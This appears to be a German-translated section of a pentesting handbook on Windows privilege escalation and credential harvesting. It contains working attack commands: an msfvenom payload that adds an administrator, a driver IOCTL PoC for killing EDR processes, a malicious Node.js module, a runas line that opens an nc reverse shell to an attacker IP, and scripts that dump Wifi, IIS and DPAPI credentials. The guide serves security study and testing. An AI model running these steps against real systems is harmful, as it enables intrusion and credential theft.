Wenn du diese Berechtigung über eine Registry hast, bedeutet das, dass du **von dieser aus Sub-Registries erstellen kannst**. Bei Windows-Services ist das **ausreichend, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Endung vor einem Leerzeichen auszuführen.

Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, Folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Alle unquoted service paths auflisten, ausgenommen diejenigen, die zu eingebauten Windows-Services gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Du kannst** diese Schwachstelle mit metasploit erkennen und ausnutzen: `exploit/windows/local/trusted\_service\_path` Du kannst manuell eine Service-Binary mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows erlaubt Benutzern, Aktionen festzulegen, die ausgeführt werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binary verweist. Wenn diese Binary austauschbar ist, könnte eine Privilege Escalation möglich sein. Weitere Details finden sich in der [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Prüfe die **permissions der binaries** (vielleicht kannst du eine überschreiben und Privileges eskalieren) und der **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Config-Datei ändern kannst, um eine spezielle Datei zu lesen, oder ob du eine Binary ändern kannst, die von einem Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL unter seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable/copy-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start zu automatischer Codeausführung innerhalb von `notepad++.exe` (einschließlich von `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Prüfe, ob du irgendein Registry- oder Binary-Objekt überschreiben kannst, das von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations to escalate privileges** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Suche nach möglichen **third party weird/vulnerable** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Driver eine beliebige Kernel-Lese-/Schreib-Primitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du durch direktes Stehlen eines SYSTEM-Token aus dem Kernel-Speicher eskalieren. Siehe die Schritt-für-Schritt-Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann das absichtliche Verlangsamen der Lookup (mit Max-Length-Komponenten oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf Dutzende Mikrosekunden verlängern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive-Schwachstellen erlauben dir, deterministische Layouts zu groomen, beschreibbare HKLM/HKU-Descendants zu missbrauchen und Metadaten-Korruption ohne custom Driver in Kernel paged-pool overflows umzuwandeln. Lerne die vollständige Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Missbrauch von fehlendem FILE_DEVICE_SECURE_OPEN bei device objects (LPE + EDR kill)

Einige signierte Third-Party-Drivers erstellen ihr device object mit einer starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird, wodurch jeder unprivilegierte User einen handle erhalten kann, indem er einen Namespace-Pfad wie diesen verwendet:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein User das device öffnen kann, können die vom Driver exponierten privilegierten IOCTLs für LPE und Manipulation missbraucht werden. In der Praxis beobachtete Fähigkeiten:
- Vollzugriffs-handles auf beliebige Prozesse zurückgeben (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unbeschränkte rohe Disk-Lese/Schreibzugriffe (Offline-Manipulation, Boot-Time-Persistenz-Tricks).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR kill aus dem User Land via Kernel möglich wird.

Minimaler PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations für Entwickler
- Setze immer FILE_DEVICE_SECURE_OPEN, wenn du Device Objects erstellst, die durch eine DACL eingeschränkt werden sollen.
- Validiere den Caller-Context für privilegierte Operationen. Füge PP/PPL-Checks hinzu, bevor du das Beenden von Prozessen oder das Zurückgeben von Handles erlaubst.
- Beschränke IOCTLs (Access Masks, METHOD_*, Input-Validierung) und erwäge brokered Modelle statt direkter Kernel-Privilegien.

Detection-Ideen für Defenders
- Überwache User-Mode-Öffnungen verdächtiger Device-Namen (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts Vulnerable-Driver-Blocklist (HVCI/WDAC/Smart App Control) und pflege eigene Allow/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Write Permissions innerhalb eines Ordners auf PATH** hast, könntest du eine DLL hijacken, die von einem Prozess geladen wird, und **Privilegien eskalieren**.

Überprüfe die Berechtigungen aller Ordner innerhalb von PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen darüber, wie man diese Prüfung missbraucht:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dies ist eine Variante von **Windows uncontrolled search path**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen direkten Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.

Node löst Pakete auf, indem es das Verzeichnisbaum nach oben durchläuft und in jedem Elternverzeichnis `node_modules`-Ordner prüft. Unter Windows kann dieser Lauf bis zum Laufwerksstamm reichen, sodass eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wird, möglicherweise Folgendes abfragt:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Rechten** `C:\node_modules` erstellen kann, kann er eine bösartige `foo.js` (oder einen Paketordner) ablegen und warten, bis ein **Node/Electron-Prozess mit höheren Rechten** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt, sodass dies zu **LPE** wird, wenn das Ziel als Administrator, über eine erhöhte geplante Aufgabe/einen Service-Wrapper oder über eine automatisch gestartete privilegierte Desktop-App läuft.

Dies ist besonders häufig, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist
- eine Drittanbieter-Bibliothek `require("foo")` in `try/catch` einbindet und bei Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert werden konnte
- das verwundbare `require()` tief im Abhängigkeitsbaum liegt statt im Hauptanwendungscode

### Hunting vulnerable targets

Verwende **Procmon**, um den Auflösungsweg nachzuweisen:

- Filter nach `Process Name` = Zielprozess (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filter nach `Path` `contains` `node_modules`
- Konzentriere dich auf `NAME NOT FOUND` und das endgültig erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Code-Review-Muster in entpackten `.asar`-Dateien oder Anwendungsquellen:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Ermittle den **fehlenden Paketnamen** aus Procmon oder durch Quellcode-Review.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:
```powershell
mkdir C:\node_modules
```
3. Ein Modul mit genau dem erwarteten Namen ablegen:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Die Opferanwendung auslösen. Wenn die Anwendung `require("foo")` versucht und das legitime Modul fehlt, kann Node `C:\node_modules\foo.js` laden.

Reale Beispiele für fehlende optionale Module, die zu diesem Muster passen, sind `bluebird` und `utf-8-validate`, aber die **Technik** ist der wiederverwendbare Teil: finde jeden **fehlenden bare import**, den ein privilegierter Windows Node/Electron-Prozess auflösen wird.

### Detection and hardening ideas

- Alarm auslösen, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien/Packages schreibt.
- Nach High-Integrity-Prozessen suchen, die aus `C:\node_modules\*` lesen.
- Alle Runtime-Abhängigkeiten in Production paketieren und die Nutzung von `optionalDependencies` prüfen.
- Code von Drittanbietern auf stille `try { require("...") } catch {}`-Muster überprüfen.
- Optionale Prüfungen deaktivieren, wenn die Library das unterstützt (zum Beispiel können einige `ws`-Deployments die Legacy-`utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` vermeiden).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Auf andere bekannte Computer prüfen, die in der hosts file fest codiert sind
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerk-Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Sieh dir diese Seite für Firewall-bezogene Befehle an**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Mehr [Befehle für Netzwerk-Enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden

Wenn du Root-Benutzer wirst, kannst du auf jedem Port lauschen (beim ersten Mal, wenn du `nc.exe` verwendest, um auf einem Port zu lauschen, wird per GUI gefragt, ob `nc` von der Firewall erlaubt werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows Vault speichert Benutzeranmeldedaten für Server, Websites und andere Programme, bei denen sich **Windows** automatisch für die Benutzer **anmelden kann**. Auf den ersten Blick könnte es so wirken, als könnten Benutzer nun ihre Facebook-Anmeldedaten, Twitter-Anmeldedaten, Gmail-Anmeldedaten usw. speichern, damit sie sich automatisch über Browser anmelden. Aber das ist nicht so.

Der Windows Vault speichert Anmeldedaten, mit denen Windows sich automatisch für die Benutzer anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten benötigt, um auf eine Ressource zuzugreifen** (Server oder eine Website), **diesen Credential Manager** & Windows Vault verwenden und die bereitgestellten Anmeldedaten nutzen kann, anstatt dass Benutzer jedes Mal Benutzername und Passwort eingeben.

Solange die Anwendungen nicht mit dem Credential Manager interagieren, glaube ich nicht, dass es möglich ist, die Anmeldedaten für eine bestimmte Ressource zu verwenden. Wenn also deine Anwendung den Vault nutzen möchte, sollte sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldedaten für diese Ressource anfordern** aus dem standardmäßigen Speicher-Vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine entfernte Binärdatei über eine SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem angegebenen Satz von Anmeldedaten.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode für symmetrische Verschlüsselung von Daten und wird vorwiegend innerhalb des Windows-Betriebssystems für die symmetrische Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um wesentlich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln über einen symmetrischen Schlüssel, der aus den Login-Geheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet sie die Domain-Authentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master Key gespeichert ist, der die privaten Schlüssel des Benutzers in derselben Datei schützt**, besteht typischerweise aus 64 Bytes Zufallsdaten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, wodurch das Auflisten seines Inhalts mit dem `dir`-Befehl in CMD verhindert wird, obwohl es über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files, die durch das master password geschützt sind**, befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Du kannst viele **DPAPI**-**masterkeys** aus dem **memory** mit dem `sekurlsa::dpapi`-Modul extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** werden oft für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte credentials bequem zu speichern. Die credentials werden mit **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur von demselben user auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um eine PS credentials aus der Datei, die sie enthält, zu **decrypt**en, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module mit dem passenden `/masterkey`, um **any .rdg files** zu **decrypt**\
Du kannst viele DPAPI masterkeys aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` module extrahieren

### Sticky Notes

People nutzen oft die StickyNotes app auf Windows workstations, um **passwords** und andere Informationen zu **save**, ohne zu wissen, dass es eine database file ist. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachte, dass du, um passwords aus AppCmd.exe zu recover, Administrator sein und unter einem High Integrity level ausführen musst.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, ist es möglich, dass einige **credentials** konfiguriert wurden und **recovered** werden können.

Dieser code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys`, also sollte man prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn du dort einen Eintrag findest, ist es wahrscheinlich ein gespeicherter SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und du möchtest, dass er beim Start automatisch startet, führe aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige ssh-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh bei einer Maschine anzumelden. Der Registry-Schlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Du kannst diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Cached GPP Pasword

Zuvor war eine Funktion verfügbar, die die Bereitstellung von benutzerdefinierten lokalen Administrator-Konten auf einer Gruppe von Maschinen über Group Policy Preferences (GPP) ermöglichte. Diese Methode hatte jedoch erhebliche Sicherheitslücken. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert wurden, von jedem Domain-Benutzer zugegriffen werden. Zweitens konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Keys verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Privilegien zu erlangen.

